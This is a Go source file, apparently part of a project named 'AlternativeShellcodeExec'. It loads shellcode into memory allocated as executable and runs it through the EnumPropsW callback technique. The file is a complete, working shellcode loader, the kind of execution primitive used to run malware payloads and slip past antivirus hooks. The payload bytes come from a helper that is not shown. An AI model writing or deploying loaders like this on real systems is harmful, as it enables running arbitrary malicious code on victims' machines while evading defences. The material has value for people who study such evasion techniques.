package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT = 0x1000
)

// Run is the main function to execute the given shellcode.
func Run(op []byte) {
	// 1. 注释：为存储 op 分配内存
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	addr, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		// 2. 错误处理：打印详细的日志
		fmt.Printf("VirtualAlloc failed: %v\n", err)
		return
	}

	// 3. 注释：处理 op 数组注意它是可变的
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// 4. 注释：获取顶层窗口句柄
	user32 := syscall.MustLoadDLL("user32.dll")
	getTopWindow := user32.MustFindProc("GetTopWindow")
	dummy, _, err := getTopWindow.Call(0)
	if dummy == 0 {
		// 2. 错误处理：打印详细的日志
		fmt.Printf("GetTopWindow failed: %v\n", err)
		return
	}

	// 5. 注释：使用 EnumPropsW 调用 shellcode
	enumPropsW := user32.MustFindProc("EnumPropsW")
	ret, _, err := enumPropsW.Call(dummy, addr)
	if ret == 0 {
		// 2. 错误处理：打印详细的日志
		fmt.Printf("EnumPropsW failed: %v\n", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
